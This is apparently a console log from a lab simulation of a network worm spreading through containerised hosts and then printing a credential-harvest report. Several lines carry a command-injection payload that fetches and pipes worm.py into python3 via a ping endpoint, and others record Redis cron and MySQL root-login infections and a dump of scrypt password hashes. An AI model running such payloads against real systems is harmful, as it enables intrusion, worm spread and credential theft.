+14:48:41 │ [94mapi         [0m │ [1m[+] 2 new infection attempts[0m
+14:48:41 │ [96mdns         [0m │ [webserver] Ping request for IP: ;curl http://172.20.0.10:8080/worm.py|python3
+14:48:41 │ [96mdns         [0m │ /bin/sh: 1: ping: not found
+14:48:41 │ [96mdns         [0m │ /bin/sh: 1: curl: not found
+14:48:42 │ [96mdns         [0m │ 172.20.0.10 - - [05/May/2026 18:48:42] "GET /ping?ip=;curl%20http://172.20.0.10:8080/worm.py%7Cpython3 HTTP/1.1" 200 -
+14:48:42 │ [1;31mWORM        [0m │ 💀 PWNED via HTTP RCE → [1m172.20.0.9[0m
+14:48:42 │ [94mapi         [0m │ [1m[+] HTTP→172.20.0.9:9000 payload delivered[0m
+14:48:42 │ [94mapi         [0m │ [📋] Logged infection: 172.20.0.9 via HTTP RCE at 79.95s
+14:48:42 │ [94mapi         [0m │ [1m[+] MySQL→db:3306 (root) connected[0m
+14:48:42 │ [1;31mWORM        [0m │ 💀 PWNED via cred-harvest → [1mdb[0m
+14:48:42 │ [94mapi         [0m │ [1m[💀] MySQL→db Harvested 1 credential sources![0m
+14:48:42 │ [94mapi         [0m │ [📋] Logged infection: db via MySQL at 80.17s
+14:48:51 │ [94mapi         [0m │ [1m[*] === CYCLE 8/10 ===[0m
+
+────────────────────────── [1mINFECTION STATUS[0m ──────────────────────────
+
+  Worm status  : [1;31mACTIVE[0m   Cycle: [1m8[0m
+  Infected (9) : [1;31m127.0.0.1, 172.20.0.2, 172.20.0.3, 172.20.0.5, 172.20.0.9, api, db, dns, victim[0m
+  Recent events:
+    [2m14:48:17[0m  172.20.0.8           via attempting
+    [2m14:48:41[0m  172.20.0.9           via attempting
+    [2m14:48:41[0m  db                   via attempting
+    [2m14:48:42[0m  172.20.0.9           via HTTP RCE
+    [2m14:48:42[0m  db                   via cred-harvest
+
+──────────────────────────────────────────────────────────────────────
+
+14:48:54 │ [94mapi         [0m │ [1m[+] 🎯 2 hosts with open ports[0m
+14:48:54 │ [94mapi         [0m │ [1m[!] No new infections (stagnant: 1)[0m
+14:49:02 │ [94mapi         [0m │ 172.20.0.11 - - [05/May/2026 18:49:02] "[32mGET / HTTP/1.1[0m" 302 -
+14:49:02 │ [94mapi         [0m │ 172.20.0.11 - - [05/May/2026 18:49:02] "GET /login?next=/ HTTP/1.1" 200 -
+14:49:04 │ [94mapi         [0m │ [1m[*] === CYCLE 9/10 ===[0m
+14:49:06 │ [94mapi         [0m │ [1m[+] 🎯 6 hosts with open ports[0m
+14:49:06 │ [1;31mWORM        [0m │ 🦠 INFECTING → [1m172.20.0.8[0m
+14:49:06 │ [94mapi         [0m │ [1m[>] 🦠 Infecting 172.20.0.8 → ports [5432][>] 🦠 Infecting redis → ports [6379][0m
+14:49:06 │ [1;31mWORM        [0m │ 🦠 INFECTING → [1m172.20.0.10[0m
+14:49:06 │ [94mapi         [0m │ [1m[>] 🦠 Infecting 172.20.0.10 → ports [8080][>] 🦠 Infecting postgres → ports [5432][0m
+14:49:06 │ [94mapi         [0m │ [1m[+] 4 new infection attempts[0m
+14:49:07 │ [1;31mWORM        [0m │ 💀 PWNED via HTTP RCE → [1m172.20.0.10[0m
+14:49:07 │ [94mapi         [0m │ [1m[+] HTTP→172.20.0.10:8080 payload delivered[0m
+14:49:07 │ [94mapi         [0m │ [📋] Logged infection: 172.20.0.10 via HTTP RCE at 104.87s
+14:49:07 │ [91mredis       [0m │ 1:M 05 May 2026 18:49:07.046 * DB saved on disk
+14:49:07 │ [1;31mWORM        [0m │ 💀 PWNED via Redis → [1mredis[0m
+14:49:07 │ [94mapi         [0m │ [1m[+] Redis→redis:6379 Infected (Cron Exploit)[0m
+14:49:07 │ [94mapi         [0m │ [📋] Logged infection: redis via Redis at 105.0s
+14:49:13 │ [94mapi         [0m │ 172.20.0.11 - - [05/May/2026 18:49:13] "GET /login HTTP/1.1" 200 -
+14:49:16 │ [94mapi         [0m │ [1m[*] === CYCLE 10/10 ===[0m
+14:49:18 │ [94mapi         [0m │ [1m[+] 🎯 3 hosts with open ports[0m
+14:49:18 │ [1;31mWORM        [0m │ 🦠 INFECTING → [1mwebserver[0m
+14:49:18 │ [94mapi         [0m │ [1m[>] 🦠 Infecting webserver → ports [80][0m
+14:49:18 │ [94mapi         [0m │ [1m[+] 1 new infection attempts[0m
+14:49:19 │ [92mwebserver   [0m │ [webserver] Ping request for IP: ;curl http://172.20.0.10:8080/worm.py|python3
+14:49:19 │ [92mwebserver   [0m │ /bin/sh: 1: ping: not found
+14:49:19 │ [92mwebserver   [0m │ /bin/sh: 1: curl: not found
+14:49:19 │ [92mwebserver   [0m │ 172.20.0.10 - - [05/May/2026 18:49:19] "GET /ping?ip=;curl%20http://172.20.0.10:8080/worm.py%7Cpython3 HTTP/1.1" 200 -
+14:49:19 │ [1;31mWORM        [0m │ 💀 PWNED via HTTP RCE → [1mwebserver[0m
+14:49:19 │ [94mapi         [0m │ [1m[+] HTTP→webserver:80 payload delivered[0m
+14:49:19 │ [94mapi         [0m │ [📋] Logged infection: webserver via HTTP RCE at 117.16s
+
+────────────────────────── [1mINFECTION STATUS[0m ──────────────────────────
+
+  Worm status  : [1;31mACTIVE[0m   Cycle: [1m10[0m
+  Infected (12) : [1;31m127.0.0.1, 172.20.0.10, 172.20.0.2, 172.20.0.3, 172.20.0.5, 172.20.0.9, api, db, dns, redis, victim, webserver[0m
+  Recent events:
+    [2m14:49:06[0m  172.20.0.10          via attempting
+    [2m14:49:07[0m  172.20.0.10          via HTTP RCE
+    [2m14:49:07[0m  redis                via Redis
+    [2m14:49:18[0m  webserver            via attempting
+    [2m14:49:19[0m  webserver            via HTTP RCE
+
+──────────────────────────────────────────────────────────────────────
+
+14:49:28 │ [92mwebserver   [0m │ 172.20.0.11 - - [05/May/2026 18:49:28] "GET / HTTP/1.1" 200 -
+14:49:29 │ [94mapi         [0m │ ======================================================================
+14:49:29 │ [94mapi         [0m │ [1m[💀] CREDENTIAL HARVEST REPORT[0m
+14:49:29 │ [94mapi         [0m │ ======================================================================
+14:49:29 │ [94mapi         [0m │ [1m[+] Database Credentials (1 sources):[0m
+14:49:29 │ [94mapi         [0m │ Source: mysql:db:3306/testdb.user
+14:49:29 │ [94mapi         [0m │ DB Login: root
+14:49:29 │ [94mapi         [0m │ → {'id': 1, 'username': 'admin', 'password_hash': 'scrypt:32768:8:1$mETPBW6eq0xLAktN$09f87e0cb2211a9f49e64a028a661bdee46b40ddd8ce2c37644f05c941702eb377b9571247f65fc6c03c99b1c2aa89713797105ca84177ecda86ad83b36e96e1'}
+14:49:29 │ [94mapi         [0m │ → {'id': 2, 'username': 'root', 'password_hash': 'scrypt:32768:8:1$Z9kELG45Y4D4Q4mH$3e76969837fa663804bbefdc7d52840671d45d23f4b0be0b10e693b717ab1cbccb5fd5665e41d539f2340e9b01fbc530fcbc4a3c810184d0c6f725227dd4ff7c'}
+14:49:29 │ [94mapi         [0m │ → {'id': 3, 'username': 'ubuntu', 'password_hash': 'scrypt:32768:8:1$o6A7JhyexWO9zF7I$94d2c83776c87b157771bd916d807b62fffa553337c033356931f4c6b595ead37c5a4c9692af092c0118827162b0b6bb2fa2e0aad20dad256d1429ff860e513c'}
+14:49:29 │ [94mapi         [0m │ → {'id': 4, 'username': 'user', 'password_hash': 'scrypt:32768:8:1$i8lprxb4NPUWGe2A$9b2f24c7b5b4c3cfc9de2a857eec3def39301c6dc2dbd40714906aee60d931ab08e58227e1f91dbba556c72d924fac44d513fa4e1e32226e259d8e41020e4698'}
+14:49:29 │ [94mapi         [0m │ → {'id': 5, 'username': 'postgres', 'password_hash': 'scrypt:32768:8:1$JCTON2W72c5sMdqE$4e0da1adfd54012be5241ac3d71c223d1f5cdf041c86cca92989780ffa611e02602bfc8cccf851cb45a0891fa7ff4e15df4a22b08260e17ab6aca90a464744dc'}
+14:49:29 │ [94mapi         [0m │ → {'id': 6, 'username': 'mysql', 'password_hash': 'scrypt:32768:8:1$F7asVVv4cFKkxqjO$1402715c3c18d5c8f470b0856197acfecc735c11ba4987af97565dba1435dcfd131c95c6471f191d73d93b259a0e79d2621101d929456c6c626ab869b827a207'}
+14:49:29 │ [94mapi         [0m │ → {'id': 7, 'username': 'guest', 'password_hash': 'scrypt:32768:8:1$BGDsbR2EeMf09kfB$3801e150fe355c54dcd3dd27f4143b01d5a97baebd994803fa061dae472853d6d0b43f274a76682521b5c6eadae40289f53919376d492f655bfbae2e17addfe2'}
+14:49:29 │ [94mapi         [0m │ → {'id': 8, 'username': 'operator', 'password_hash': 'scrypt:32768:8:1$ecnpkDgEo8rzaxpv$feca0c51e54fd5dc96d9f5febeda92cc5f85388c63cf0e0642657d81f5be2aae95d45d147e96355adc47de40c1e947bac1ccff8e627f99fab18cfdd7f501f56b'}
+14:49:29 │ [94mapi         [0m │ → {'id': 9, 'username': 'sysadmin', 'password_hash': 'scrypt:32768:8:1$qnM2KDQXZJH8aFg9$24d098b9b39c58c75040092a6a8a26460567c04bd00a10e75df8a060d45a3463bb08850b3015a5431756d756ca9c3ce31613194e047b35bfbccc3bdfdda07c56'}
+14:49:29 │ [94mapi         [0m │ → {'id': 10, 'username': 'it_support', 'password_hash': 'scrypt:32768:8:1$E6pAg9kmvNv1zIQ8$4c3dfb38127ebadb178cd4d953f05c3be14eeb4024fe1c1ca4afc5771103075768225354df171f93e02f84f17b2d95addf897bc85f4e1e29f97675e0698ff71d'}
+14:49:29 │ [94mapi         [0m │ ======================================================================
+14:49:29 │ [94mapi         [0m │ [1m[💀] END OF CREDENTIAL REPORT[0m
+14:49:29 │ [94mapi         [0m │ ======================================================================
+14:49:29 │ [94mapi         [0m │ [📋] Propagation log saved → /uploads/propagation_log.csv (13 events)
+14:49:29 │ [94mapi         [0m │ [1m[*] === WORM COMPLETE ===[0m
+14:49:29 │ [94mapi         [0m │ [1m[*] Strategy: random[0m
+14:49:29 │ [94mapi         [0m │ [1m[*] Cycles: 10[0m
+14:49:29 │ [94mapi         [0m │ [1m[*] Total infected: 13[0m
+14:49:29 │ [94mapi         [0m │ [1m[*] Infected hosts: ['db', '172.20.0.3', 'dns', '172.20.0.2', 'victim', '172.20.0.5', '127.0.0.1', '172.20.0.7', '172.20.0.9', '172.20.0.10', 'redis', 'webserver', 'api'][0m
+14:49:31 │ [92mwebserver   [0m │ 172.20.0.11 - - [05/May/2026 18:49:31] "GET / HTTP/1.1" 200 -
+14:49:39 │ [92mwebserver   [0m │ 172.20.0.11 - - [05/May/2026 18:49:39] "GET / HTTP/1.1" 200 -
+14:49:50 │ [94mapi         [0m │ 172.20.0.11 - - [05/May/2026 18:49:50] "[32mPOST /login HTTP/1.1[0m" 302 -
+14:49:50 │ [94mapi         [0m │ 172.20.0.11 - - [05/May/2026 18:49:50] "GET / HTTP/1.1" 200 -
+14:49:50 │ [94mapi         [0m │ 172.20.0.11 - - [05/May/2026 18:49:50] "GET / HTTP/1.1" 200 -
+14:49:50 │ [94mapi         [0m │ 172.20.0.11 - - [05/May/2026 18:49:50] "[32mGET /logout HTTP/1.1[0m" 302 -
+14:49:50 │ [94mapi         [0m │ 172.20.0.11 - - [05/May/2026 18:49:50] "GET /login HTTP/1.1" 200 -
+
+────────────────────────── [1mINFECTION STATUS[0m ──────────────────────────
+
+  Worm status  : [1;31mACTIVE[0m   Cycle: [1m10[0m
+  Infected (12) : [1;31m127.0.0.1, 172.20.0.10, 172.20.0.2, 172.20.0.3, 172.20.0.5, 172.20.0.9, api, db, dns, redis, victim, webserver[0m
+  Recent events:
+    [2m14:49:06[0m  172.20.0.10          via attempting
+    [2m14:49:07[0m  172.20.0.10          via HTTP RCE
+    [2m14:49:07[0m  redis                via Redis
+    [2m14:49:18[0m  webserver            via attempting
+    [2m14:49:19[0m  webserver            via HTTP RCE
+
+──────────────────────────────────────────────────────────────────────
+
+14:50:07 │ [94mapi         [0m │ 172.20.0.11 - - [05/May/2026 18:50:07] "[32mPOST /login HTTP/1.1[0m" 302 -
+14:50:07 │ [94mapi         [0m │ 172.20.0.11 - - [05/May/2026 18:50:07] "GET / HTTP/1.1" 200 -
+14:50:08 │ [94mapi         [0m │ 172.20.0.11 - - [05/May/2026 18:50:08] "GET / HTTP/1.1" 200 -
+14:50:08 │ [94mapi         [0m │ 172.20.0.11 - - [05/May/2026 18:50:08] "[32mGET /logout HTTP/1.1[0m" 302 -
+14:50:08 │ [94mapi         [0m │ 172.20.0.11 - - [05/May/2026 18:50:08] "GET /login HTTP/1.1" 200 -
+
+────────────────────────── [1mINFECTION STATUS[0m ──────────────────────────
+
+  Worm status  : [1;31mACTIVE[0m   Cycle: [1m10[0m
+  Infected (12) : [1;31m127.0.0.1, 172.20.0.10, 172.20.0.2, 172.20.0.3, 172.20.0.5, 172.20.0.9, api, db, dns, redis, victim, webserver[0m
+  Recent events:
+    [2m14:49:06[0m  172.20.0.10          via attempting
+    [2m14:49:07[0m  172.20.0.10          via HTTP RCE
+    [2m14:49:07[0m  redis                via Redis
+    [2m14:49:18[0m  webserver            via attempting
+    [2m14:49:19[0m  webserver            via HTTP RCE
+
+──────────────────────────────────────────────────────────────────────
+
+14:50:31 │ [94mapi         [0m │ 172.20.0.11 - - [05/May/2026 18:50:31] "[32mPOST /login HTTP/1.1[0m" 302 -
+14:50:31 │ [94mapi         [0m │ 172.20.0.11 - - [05/May/2026 18:50:31] "GET / HTTP/1.1" 200 -
+14:50:31 │ [94mapi         [0m │ 172.20.0.11 - - [05/May/2026 18:50:31] "GET / HTTP/1.1" 200 -
+14:50:31 │ [94mapi         [0m │ 172.20.0.11 - - [05/May/2026 18:50:31] "[32mGET /logout HTTP/1.1[0m" 302 -
+14:50:31 │ [94mapi         [0m │ 172.20.0.11 - - [05/May/2026 18:50:31] "GET /login HTTP/1.1" 200 -
+14:50:40 │ [94mapi         [0m │ 172.20.0.11 - - [05/May/2026 18:50:40] "[32mPOST /login HTTP/1.1[0m" 302 -
+14:50:40 │ [94mapi         [0m │ 172.20.0.11 - - [05/May/2026 18:50:40] "GET / HTTP/1.1" 200 -
+14:50:40 │ [94mapi         [0m │ 172.20.0.11 - - [05/May/2026 18:50:40] "GET / HTTP/1.1" 200 -
+14:50:40 │ [94mapi         [0m │ 172.20.0.11 - - [05/May/2026 18:50:40] "[32mGET /logout HTTP/1.1[0m" 302 -
+14:50:40 │ [94mapi         [0m │ 172.20.0.11 - - [05/May/2026 18:50:40] "GET /login HTTP/1.1" 200 -
+
+────────────────────────── [1mINFECTION STATUS[0m ──────────────────────────
+
+  Worm status  : [1;31mACTIVE[0m   Cycle: [1m10[0m
+  Infected (12) : [1;31m127.0.0.1, 172.20.0.10, 172.20.0.2, 172.20.0.3, 172.20.0.5, 172.20.0.9, api, db, dns, redis, victim, webserver[0m
+  Recent events:
+    [2m14:49:06[0m  172.20.0.10          via attempting
+    [2m14:49:07[0m  172.20.0.10          via HTTP RCE
+    [2m14:49:07[0m  redis                via Redis
+    [2m14:49:18[0m  webserver            via attempting
+    [2m14:49:19[0m  webserver            via HTTP RCE
+
+──────────────────────────────────────────────────────────────────────
+
+14:51:05 │ [94mapi         [0m │ 172.20.0.11 - - [05/May/2026 18:51:05] "GET /login HTTP/1.1" 200 -
+
+────────────────────────── [1mINFECTION STATUS[0m ──────────────────────────
+
+  Worm status  : [1;31mACTIVE[0m   Cycle: [1m10[0m
+  Infected (12) : [1;31m127.0.0.1, 172.20.0.10, 172.20.0.2, 172.20.0.3, 172.20.0.5, 172.20.0.9, api, db, dns, redis, victim, webserver[0m
+  Recent events:
+    [2m14:49:06[0m  172.20.0.10          via attempting
+    [2m14:49:07[0m  172.20.0.10          via HTTP RCE
+    [2m14:49:07[0m  redis                via Redis
+    [2m14:49:18[0m  webserver            via attempting
+    [2m14:49:19[0m  webserver            via HTTP RCE
+
+──────────────────────────────────────────────────────────────────────
+
+14:51:26 │ [94mapi         [0m │ 172.20.0.11 - - [05/May/2026 18:51:26] "GET /login HTTP/1.1" 200 -
+14:51:43 │ [94mapi         [0m │ 172.20.0.11 - - [05/May/2026 18:51:43] "[32mPOST /login HTTP/1.1[0m" 302 -
+14:51:43 │ [94mapi         [0m │ 172.20.0.11 - - [05/May/2026 18:51:43] "GET / HTTP/1.1" 200 -
+14:51:43 │ [94mapi         [0m │ 172.20.0.11 - - [05/May/2026 18:51:43] "GET / HTTP/1.1" 200 -
+14:51:43 │ [94mapi         [0m │ 172.20.0.11 - - [05/May/2026 18:51:43] "[32mGET /logout HTTP/1.1[0m" 302 -
+14:51:44 │ [94mapi         [0m │ 172.20.0.11 - - [05/May/2026 18:51:44] "GET /login HTTP/1.1" 200 -
